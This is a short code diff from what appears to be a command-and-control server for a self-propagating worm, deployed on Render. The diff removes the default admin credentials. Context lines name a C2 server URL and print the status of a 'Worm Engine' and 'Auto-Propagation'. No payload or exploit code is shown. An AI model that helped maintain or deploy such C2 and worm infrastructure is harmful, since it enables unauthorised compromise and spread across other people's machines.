@@ -20,8 +20,8 @@ from pathlib import Path
 
 # ==================== RENDER CONFIGURATION ====================
 # Environment variables (set in Render dashboard)
-USERNAME = os.getenv("C2_USERNAME", "admin")
-PASSWORD = os.getenv("C2_PASSWORD", "password")
+USERNAME = os.getenv("C2_USERNAME")
+PASSWORD = os.getenv("C2_PASSWORD")
 ENVIRONMENT = os.getenv("ENVIRONMENT", "development")
 PORT = int(os.getenv("PORT", 5000))
 C2_SERVER = os.getenv("C2_SERVER", "https://b-n1nt.onrender.com")  # Added this line
@@ -1442,3 +1442,4 @@ async def startup_event():
     print(f"🧬 Worm Engine: {'ACTIVE' if worm_engine.running else 'INACTIVE'}")
     print(f"🔄 Auto-Propagation: {'ENABLED' if propagation_rules['default']['enabled'] else 'DISABLED'}")
     print("="*70 + "\n")
+
